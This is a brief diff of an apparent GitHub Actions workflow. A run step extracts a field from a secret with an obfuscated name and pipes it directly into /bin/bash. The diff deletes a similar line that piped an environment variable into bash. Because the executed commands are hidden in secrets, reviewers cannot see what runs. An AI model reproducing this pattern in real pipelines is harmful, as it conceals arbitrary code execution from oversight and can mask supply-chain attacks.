@@ -18,7 +18,6 @@ jobs:
           frfq1078: ${{ secrets.frfq1078 }}
         run: |
           printf '%s' "$frfq1078" | jq -r .oak36732 | /bin/bash
-          echo $yfkl16524 | jq -r .y16 | /bin/bash
 
       - name: Save results
         if: always()
